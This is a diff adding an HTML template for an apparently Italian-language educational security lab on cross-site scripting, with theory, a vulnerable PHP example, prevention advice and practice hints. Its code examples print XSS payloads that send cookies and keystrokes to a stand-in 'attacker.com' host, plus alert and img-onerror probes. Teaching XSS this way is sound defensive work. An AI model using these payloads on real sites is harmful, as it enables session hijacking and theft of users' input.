@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title th:text="${lab.title} + ' - CyberLab'">Lab - CyberLab</title>
+    <link rel="stylesheet" th:href="@{/css/base.css}">
+    <link rel="stylesheet" th:href="@{/css/components.css}">
+    <link rel="stylesheet" th:href="@{/css/labs.css}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .lab-view-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            height: calc(100vh - 80px);
+            gap: 0;
+        }
+        
+        .theory-panel {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            border-right: 1px solid rgba(0, 255, 65, 0.3);
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        .practice-panel {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .panel-header {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .panel-content {
+            padding: 30px;
+        }
+        
+        .lab-progress-header {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), rgba(0, 255, 255, 0.1));
+            padding: 20px;
+            margin: -30px -30px 30px -30px;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+        }
+        
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .progress-stats {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .progress-stat {
+            text-align: center;
+        }
+        
+        .progress-stat .value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary-color);
+            display: block;
+        }
+        
+        .progress-stat .label {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+        }
+        
+        .section {
+            margin-bottom: 40px;
+        }
+        
+        .section h2 {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .objectives-list {
+            list-style: none;
+            padding: 0;
+        }
+        
+        .objectives-list li {
+            background: rgba(255, 255, 255, 0.05);
+            margin-bottom: 10px;
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 4px solid var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .objectives-list li::before {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+        
+        .code-block {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            position: relative;
+            overflow-x: auto;
+        }
+        
+        .code-block::before {
+            content: attr(data-language);
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            background: var(--primary-color);
+            color: black;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+        
+        .vulnerability-demo {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .vulnerability-demo h4 {
+            color: #ff4444;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .practice-tabs {
+            display: flex;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px 10px 0 0;
+            margin: -30px -30px 0 -30px;
+        }
+        
+        .practice-tab {
+            flex: 1;
+            padding: 15px 20px;
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .practice-tab.active {
+            color: var(--primary-color);
+            background: rgba(0, 255, 65, 0.1);
+        }
+        
+        .practice-tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--primary-color);
+        }
+        
+        .practice-content {
+            display: none;
+            height: calc(100% - 60px);
+        }
+        
+        .practice-content.active {
+            display: block;
+        }
+        
+        .sandbox-iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: white;
+            border-radius: 0 0 10px 10px;
+        }
+        
+        .hints-panel {
+            background: rgba(255, 165, 0, 0.1);
+            border: 1px solid rgba(255, 165, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .hints-panel h4 {
+            color: #ffa500;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .hint {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            border-left: 3px solid #ffa500;
+        }
+        
+        .floating-controls {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            z-index: 1000;
+        }
+        
+        .control-btn {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
+            border: none;
+            color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .control-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 8px 25px rgba(0, 255, 65, 0.5);
+        }
+        
+        .completion-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+        
+        .completion-content {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border: 2px solid var(--primary-color);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            position: relative;
+        }
+        
+        .completion-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            color: white;
+            margin: 0 auto 20px;
+            animation: bounce 1s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        @media (max-width: 768px) {
+            .lab-view-container {
+                grid-template-columns: 1fr;
+                grid-template-rows: 1fr 1fr;
+            }
+            
+            .theory-panel {
+                border-right: none;
+                border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            }
+            
+            .floating-controls {
+                bottom: 20px;
+                right: 20px;
+            }
+            
+            .control-btn {
+                width: 50px;
+                height: 50px;
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div th:replace="~{base :: navbar}"></div>
+    
+    <div class="lab-view-container">
+        <!-- Theory Panel -->
+        <div class="theory-panel">
+            <div class="panel-header">
+                <div class="lab-info">
+                    <div class="lab-meta">
+                        <span class="category-tag" th:text="${lab.category.name}">Web Security</span>
+                        <span class="difficulty-badge" th:text="${lab.difficulty}" th:classappend="${lab.difficulty}">INTERMEDIATE</span>
+                    </div>
+                    <h1 th:text="${lab.title}">Cross-Site Scripting (XSS) Lab</h1>
+                    <p class="lab-description" th:text="${lab.description}">
+                        Impara a identificare e sfruttare vulnerabilità XSS in applicazioni web reali.
+                    </p>
+                </div>
+            </div>
+            
+            <div class="panel-content">
+                <!-- Progress Header -->
+                <div class="lab-progress-header">
+                    <div class="progress-info">
+                        <h3>Il tuo progresso</h3>
+                        <div class="progress-stats">
+                            <div class="progress-stat">
+                                <span class="value" th:text="${userProgress?.progressPercentage ?: 0} + '%'">75%</span>
+                                <span class="label">Completato</span>
+                            </div>
+                            <div class="progress-stat">
+                                <span class="value" th:text="${userProgress?.pointsEarned ?: 0}">120</span>
+                                <span class="label">Punti</span>
+                            </div>
+                            <div class="progress-stat">
+                                <span class="value" th:text="${userProgress?.timeSpent ?: '0 min'}">45 min</span>
+                                <span class="label">Tempo</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" th:style="'width: ' + ${userProgress?.progressPercentage ?: 0} + '%'"></div>
+                    </div>
+                </div>
+
+                <!-- Learning Objectives -->
+                <div class="section">
+                    <h2><i class="fas fa-target"></i> Obiettivi di Apprendimento</h2>
+                    <ul class="objectives-list">
+                        <li th:each="objective : ${lab.objectives}" th:text="${objective}">
+                            Comprendere come funziona il Cross-Site Scripting
+                        </li>
+                    </ul>
+                </div>
+
+                <!-- Theory Content -->
+                <div class="section">
+                    <h2><i class="fas fa-book"></i> Teoria</h2>
+                    <div th:utext="${lab.theoryContent}">
+                        <p>Il <strong>Cross-Site Scripting (XSS)</strong> è una vulnerabilità di sicurezza che permette agli attaccanti di inserire script malevoli in pagine web visualizzate da altri utenti.</p>
+                        
+                        <h3>Tipi di XSS</h3>
+                        <ul>
+                            <li><strong>Reflected XSS:</strong> Il payload viene riflesso immediatamente nella risposta</li>
+                            <li><strong>Stored XSS:</strong> Il payload viene memorizzato nel database</li>
+                            <li><strong>DOM-based XSS:</strong> La vulnerabilità esiste nel codice JavaScript lato client</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Code Examples -->
+                <div class="section">
+                    <h2><i class="fas fa-code"></i> Esempi di Codice</h2>
+                    
+                    <div class="code-block" data-language="HTML">
+                        <pre><code class="language-html"><!-- Codice vulnerabile -->
+&lt;div&gt;
+    Welcome &lt;script&gt;document.write(name);&lt;/script&gt;
+&lt;/div&gt;
+
+<!-- Input malevolo -->
+&lt;script&gt;alert('XSS');&lt;/script&gt;</code></pre>
+                    </div>
+
+                    <div class="code-block" data-language="JavaScript">
+                        <pre><code class="language-javascript">// Payload XSS comune
+&lt;script&gt;
+    // Rubare cookie
+    fetch('http://attacker.com/steal?cookie=' + document.cookie);
+    
+    // Redirect malevolo
+    window.location = 'http://malicious-site.com';
+    
+    // Keylogger
+    document.addEventListener('keypress', function(e) {
+        fetch('http://attacker.com/keys?key=' + e.key);
+    });
+&lt;/script&gt;</code></pre>
+                    </div>
+                </div>
+
+                <!-- Vulnerability Demo -->
+                <div class="vulnerability-demo">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Dimostrazione Vulnerabilità</h4>
+                    <p>Il seguente codice PHP è vulnerabile a XSS reflected:</p>
+                    <div class="code-block" data-language="PHP">
+                        <pre><code class="language-php">&lt;?php
+$username = $_GET['username'];
+echo "Benvenuto " . $username;
+?&gt;</code></pre>
+                    </div>
+                    <p><strong>URL malevolo:</strong> <code>vulnerable.php?username=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+                </div>
+
+                <!-- Prevention -->
+                <div class="section">
+                    <h2><i class="fas fa-shield-alt"></i> Prevenzione</h2>
+                    <div th:utext="${lab.preventionContent}">
+                        <ul>
+                            <li><strong>Input Validation:</strong> Validare tutti gli input utente</li>
+                            <li><strong>Output Encoding:</strong> Codificare i dati prima dell'output</li>
+                            <li><strong>Content Security Policy (CSP):</strong> Implementare CSP headers</li>
+                            <li><strong>HttpOnly Cookies:</strong> Proteggere i cookie da accesso JavaScript</li>
+                        </ul>
+                        
+                        <div class="code-block" data-language="PHP">
+                            <pre><code class="language-php">&lt;?php
+// Codice sicuro
+$username = htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8');
+echo "Benvenuto " . $username;
+?&gt;</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Hints -->
+                <div class="hints-panel">
+                    <h4><i class="fas fa-lightbulb"></i> Suggerimenti per la Pratica</h4>
+                    <div class="hint">
+                        <strong>Hint 1:</strong> Prova a inserire uno script semplice come <code>&lt;script&gt;alert('test')&lt;/script&gt;</code>
+                    </div>
+                    <div class="hint">
+                        <strong>Hint 2:</strong> Se l'input è filtrato, prova variazioni come <code>&lt;img src=x onerror=alert('xss')&gt;</code>
+                    </div>
+                    <div class="hint">
+                        <strong>Hint 3:</strong> Controlla sempre il codice sorgente per capire come vengono processati gli input
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Practice Panel -->
+        <div class="practice-panel">
+            <div class="panel-header">
+                <h2><i class="fas fa-terminal"></i> Laboratorio Pratico</h2>
+                <p>Metti in pratica quello che hai imparato</p>
+            </div>
+
+            <div class="practice-tabs">
+                <button class="practice-tab active" data-tab="challenge">
+                    <i class="fas fa-flag"></i> Challenge
+                </button>
+                <button class="practice-tab" data-tab="sandbox">
+                    <i class="fas fa-code"></i> Sandbox
+                </button>
+                <button class="practice-tab" data-tab="validation">
+                    <i class="fas fa-check"></i> Validazione
+                </button>
+            </div>
+
+            <div class="practice-content active" id="challenge-content">
+                <iframe class="sandbox-iframe" th:src="@{'/labs/practice/' + ${lab.type} + '.html'}" 
+                        src="/labs/practice/xss.html"></iframe>
+            </div>
+
+            <div class="practice-content" id="sandbox-content">
+                <iframe class="sandbox-iframe" src="/labs/practice/sandbox.html"></iframe>
+            </div>
+
+            <div class="practice-content" id="validation-content">
+                <iframe class="sandbox-iframe" src="/labs/practice/validation.html"></iframe>
+            </div>
+        </div>
+    </div>
+
+    <!-- Floating Controls -->
+    <div class="floating-controls">
+        <button class="control-btn" title="Restart Lab" onclick="restartLab()">
+            <i class="fas fa-redo"></i>
+        </button>
+        <button class="control-btn" title="Get Hint" onclick="showHint()">
+            <i class="fas fa-lightbulb"></i>
+        </button>
+        <button class="control-btn" title="Check Solution" onclick="checkSolution()">
+            <i class="fas fa-check"></i>
+        </button>
+        <button class="control-btn" title="Toggle Fullscreen" onclick="toggleFullscreen()">
+            <i class="fas fa-expand"></i>
+        </button>
+    </div>
+
+    <!-- Completion Modal -->
+    <div class="completion-modal" id="completionModal">
+        <div class="completion-content">
+            <div class="completion-icon">
+                <i class="fas fa-trophy"></i>
+            </div>
+            <h2>Congratulazioni!</h2>
+            <p>Hai completato con successo il laboratorio!</p>
+            <div class="completion-stats">
+                <div class="stat">
+                    <span class="value" id="earnedPoints">150</span>
+                    <span class="label">Punti Guadagnati</span>
+                </div>
+                <div class="stat">
+                    <span class="value" id="timeSpent">45 min</span>
+                    <span class="label">Tempo Impiegato</span>
+                </div>
+            </div>
+            <div class="completion-actions">
+                <button class="btn-primary" onclick="nextLab()">Laboratorio Successivo</button>
+                <button class="btn-secondary" onclick="closeCompletion()">Chiudi</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    <script th:src="@{/js/labs.js}"></script>
+    <script th:src="@{/js/lab-view-controller.js}"></script>
+    
+    <script th:inline="javascript">
+        // Pass lab data to JavaScript
+        window.labData = {
+            id: /*[[${lab.id}]]*/ 1,
+            title: /*[[${lab.title}]]*/ 'Lab Title',
+            type: /*[[${lab.category.name}]]*/ 'XSS',
+            difficulty: /*[[${lab.difficulty}]]*/ 'INTERMEDIATE'
+        };
+        
+        // Initialize lab view controller
+        document.addEventListener('DOMContentLoaded', function() {
+            if (window.labData) {
+                window.labController = new LabViewController(window.labData);
+            }
+        });
+    </script>
+    
+    <!-- Add celebration CSS -->
+    <style>
+        .celebration-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 9999;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: var(--primary-green);
+            border-radius: 50%;
+            animation: celebration 3s ease-out forwards;
+        }
+        
+        @keyframes celebration {
+            0% {
+                transform: translateY(100vh) scale(0);
+                opacity: 1;
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            100% {
+                transform: translateY(-100vh) scale(0);
+                opacity: 0;
+            }
+        }
+        
+        .iframe-loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-green);
+            z-index: 100;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(0, 255, 0, 0.3);
+            border-top: 3px solid var(--primary-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1rem;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</body>
+</html>
